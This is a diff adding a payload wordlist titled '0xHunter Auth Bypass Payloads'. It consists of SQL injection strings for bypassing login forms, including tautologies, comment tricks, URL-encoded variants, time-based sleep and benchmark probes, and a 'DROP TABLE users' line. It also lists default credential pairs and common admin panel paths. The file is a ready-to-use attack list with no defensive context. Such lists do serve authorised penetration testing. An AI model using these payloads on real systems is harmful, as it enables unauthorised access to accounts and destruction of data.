@@ -1,0 +1,74 @@
+# 0xHunter Auth Bypass Payloads
+admin'--
+admin' #
+' OR 1=1--
+' OR 1=1#
+' OR '1'='1
+') OR ('1'='1
+admin' OR 1=1--
+admin:admin
+admin:password
+admin:123456
+root:root
+root:toor
+test:test
+guest:guest
+administrator:administrator
+/admin
+/administrator
+/admin/login
+/wp-admin
+/dashboard
+/panel
+/cpanel
+/manager
+/backend
+/secure
+admin'--
+admin'#
+admin'/*
+' OR 1=1--
+' OR 1=1#
+' OR '1'='1'--
+admin' OR '1'='1
+admin' OR '1'='1'--
+admin' OR '1'='1'#
+admin'OR 1=1--
+') OR ('1'='1
+') OR ('1'='1'--
+admin') OR ('1'='1
+" OR "1"="1
+" OR "1"="1"--
+admin" OR "1"="1
+admin" OR "1"="1"--
+" OR 1=1--
+" OR 1=1#
+'OR 1=1--
+'OR 1=1#
+admin' LIMIT 1--
+admin' LIMIT 1#
+' OR 1=1 LIMIT 1--
+' OR 'x'='x
+' OR ''='
+' OR 1--
+' OR 1#
+or 1=1
+or 1=1--
+or 1=1#
+1' or '1'='1
+1" or "1"="1
+1 or 1=1
+' or 1=1;--
+'; DROP TABLE users--
+admin'--+
+admin'+OR+1=1--
+admin%27--
+admin%27+OR+1=1--
+%27 OR 1=1--
+%22 OR %221%22=%221
+' OR 2>1--
+' OR 1<2--
+' OR 'unusual'='unusual
+admin'||'
+' OR sleep(5)--
+' OR benchmark(5000000,MD5(1))--
